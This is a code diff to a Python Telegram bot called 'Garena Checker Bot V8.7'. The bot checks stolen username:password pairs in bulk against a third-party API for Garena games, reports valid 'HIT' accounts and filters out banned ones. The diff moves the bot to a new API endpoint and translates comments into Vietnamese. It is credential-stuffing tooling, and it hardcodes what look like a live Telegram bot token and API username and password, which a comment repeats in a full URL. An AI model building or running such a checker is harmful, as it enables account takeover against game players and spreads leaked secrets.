@@ -1,11 +1,6 @@
 # ========================================================================
 #    GARENA CHECKER BOT V8.7 - FULL SYSTEM + FILTER BANNED
-# ========================================================================
-#    - Tự động lọc acc BAN (không hiển thị)
-#    - Bỏ qua acc lỗi, không hiển thị
-#    - Chỉ hiển thị HIT và DEAD
-#    - Web dashboard chuyên nghiệp
-#    - Format HIT đẹp, không đường kẻ
+#    CẬP NHẬT API: purchase.nhatminh301.com
 # ========================================================================
 
 import subprocess
@@ -622,7 +617,7 @@ function closeModal() {{
     document.getElementById('modalOverlay').classList.remove('active');
 }}
 
-// Chart
+// Biểu đồ
 const ctx = document.getElementById('dailyChart').getContext('2d');
 const dailyData = {json.dumps(last_7_days)};
 const labels = [];
@@ -697,7 +692,7 @@ def start_render_server():
 
 threading.Thread(target=start_render_server, daemon=True).start()
 
-# ========== CONFIG ==========
+# ========== CẤU HÌNH API MỚI ==========
 TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
 ADMIN_CHAT_ID = "5736655322"
 ADMIN_USERNAME = "baohuyno1"
@@ -706,9 +701,10 @@ REQUIRED_CHANNEL = "@hakiiosvip"
 REQUIRED_CHANNEL_ID = "@hakiiosvip"
 REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"
 
-API_BASE = "https://lol.nhatminh301.com"
-API_USERNAME = "thaituduc"
-API_PASSWORD = "thaituduc"
+# API MỚI - purchase.nhatminh301.com
+API_BASE = "https://purchase.nhatminh301.com"
+API_USERNAME = "api_7567975053"
+API_PASSWORD = "iNH0Tz1daeia"
 
 DEFAULT_THREADS = 50
 DEFAULT_TIMEOUT = 60
@@ -723,6 +719,7 @@ CHECKMULTI_BATCH_DELAY = 3.0
 OUTPUT_LOC = "loc_accounts.txt"
 MAX_MESSAGE_LENGTH = 4000
 
+# ROUTE API MỚI - purchase.nhatminh301.com/api/{service}
 SERVICE_ROUTES = {
     "lienquan": {"route": "/api/lienquan", "desc": "Lien Quan Mobile", "icon": "🎮", "params": ["tk", "mk"]},
     "miniworld": {"route": "/api/miniworld", "desc": "Mini World", "icon": "🌍", "params": ["tk", "mk"]},
@@ -747,7 +744,7 @@ start_time = time.time()
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
 
-# ========== UTILITY FUNCTIONS ==========
+# ========== HÀM TIỆN ÍCH ==========
 def rate_limit(delay=DEFAULT_DELAY):
     global last_request_time
     with rate_lock:
@@ -762,7 +759,7 @@ def fix_encoding(text):
         return text
     replacements = {
         'Ã¡': 'á', 'Ã ': 'à', 'áº£': 'ả', 'Ã£': 'ã', 'áº¡': 'ạ',
-        'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
+        'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
         'Ã¢': 'â', 'Äƒ': 'ă', 'Ãª': 'ê', 'Ã­': 'í', 'Ã¬': 'ì',
         'á»‹': 'ị', 'á»‰': 'ỉ', 'Ä©': 'ĩ', 'Ã³': 'ó', 'Ã²': 'ò',
         'Ãº': 'ú', 'Ã¹': 'ù', 'Ã½': 'ý', 'á»³': 'ỳ',
@@ -868,7 +865,7 @@ def should_skip_field(value):
         return not value
     return False
 
-# ========== API CHECK ==========
+# ========== CHECK API - CẬP NHẬT ENDPOINT MỚI ==========
 def check_account_api(username, password, service, use_delay=True):
     if use_delay:
         rate_limit(DEFAULT_DELAY)
@@ -879,14 +876,17 @@ def check_account_api(username, password, service, use_delay=True):
             return cache_results[cache_key]
     
     service_info = SERVICE_ROUTES.get(service, {})
+    # CẬP NHẬT: Sử dụng API_BASE mới = purchase.nhatminh301.com
+    # URL: https://purchase.nhatminh301.com/api/lienquan?username=api_7567975053&password=iNH0Tz1daeia&tk=TK&mk=MK
     params = {"username": API_USERNAME, "password": API_PASSWORD}
     params[service_info.get("params", ["tk", "mk"])[0]] = username
     params[service_info.get("params", ["tk", "mk"])[1]] = password
     
     for attempt in range(DEFAULT_RETRIES):
         try:
-            resp = requests.get(f"{API_BASE}{service_info.get('route', '/api/lienquan')}", 
-                              params=params, timeout=DEFAULT_TIMEOUT)
+            # Gọi API endpoint mới
+            url = f"{API_BASE}{service_info.get('route', '/api/lienquan')}"
+            resp = requests.get(url, params=params, timeout=DEFAULT_TIMEOUT)
             if resp.status_code == 200:
                 try:
                     data = resp.json()
@@ -895,7 +895,7 @@ def check_account_api(username, password, service, use_delay=True):
                             if isinstance(v, str):
                                 data[k] = fix_encoding(v)
                         
-                        # CHECK BANNED - Tự động lọc acc BAN
+                        # KIỂM TRA BANNED - Tự động lọc acc BAN
                         is_banned = False
                         for field in ["banned", "ban", "aov_banned"]:
                             if field in data:
@@ -909,7 +909,7 @@ def check_account_api(username, password, service, use_delay=True):
                                 cache_results[cache_key] = data
                             return data
                         
-                        # CHECK HIT
+                        # KIỂM TRA HIT
                         is_hit = False
                         if data.get("status") in [True, "true", 1, "1", "success", "HIT", "hit"]:
                             is_hit = True
@@ -943,7 +943,7 @@ def check_account_api(username, password, service, use_delay=True):
         cache_results[cache_key] = result
     return result
 
-# ========== FORMAT HIT ==========
+# ========== ĐỊNH DẠNG HIT ==========
 def format_hit_info(username, password, service, data):
     icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
     desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
@@ -1021,18 +1021,15 @@ def format_hit_info(username, password, service, data):
     
     return msg
 
-# ========== CHECK FUNCTIONS ==========
+# ========== HÀM CHECK ==========
 def check_single(chat_id, username, password, service="lienquan"):
     result = check_account_api(username, password, service, use_delay=False)
     result_type = result.get("result", "unknown")
     
-    # Bỏ qua BAN và ERROR, chỉ hiển thị HIT và DEAD
     if result_type == "banned":
-        # Không hiển thị gì, chỉ update stats
         update_stats(banned_count=1, service=service)
         return
     elif result_type == "error":
-        # Không hiển thị gì, chỉ update stats
         update_stats(error_count=1, service=service)
         return
     elif result_type == "hit":
@@ -1042,7 +1039,6 @@ def check_single(chat_id, username, password, service="lienquan"):
         safe_send_message(chat_id, f"❌ <b>DEAD - {SERVICE_ROUTES.get(service, {}).get('desc', service)}</b>\n🔑 <code>{username}:{password}</code>")
         update_stats(dead_count=1, service=service)
     else:
-        # Không hiển thị lỗi không xác định
         update_stats(error_count=1, service=service)
 
 def check_batch(chat_id, accounts, service):
@@ -1166,7 +1162,7 @@ def check_all_services(chat_id, accounts):
     
     safe_send_message(chat_id, f"✅ CHECK ALL HOAN TAT!\n🎯 HIT: {stats_all['hits']}\n❌ DEAD: {stats_all['dead']}\n🚫 BANNED: {stats_all['banned']}\n⚠️ ERRORS: {stats_all['errors']}\n⏱ {elapsed:.1f}s")
 
-# ========== BOT COMMANDS ==========
+# ========== LỆNH BOT ==========
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     if not check_membership(message):
@@ -1305,6 +1301,7 @@ def main():
     print("=" * 60)
     print("    GARENA CHECKER V8.7 - FULL SYSTEM + FILTER BAN")
     print("    ADMIN: @baohuyno1")
+    print("    API: purchase.nhatminh301.com")
     print("    ===== LOC ACC BAN - KHONG HIEN THI ===== ")
     print("    ===== LOC ACC ERROR - KHONG HIEN THI ===== ")
     print("    ===== CHI HIEN THI HIT VA DEAD ===== ")
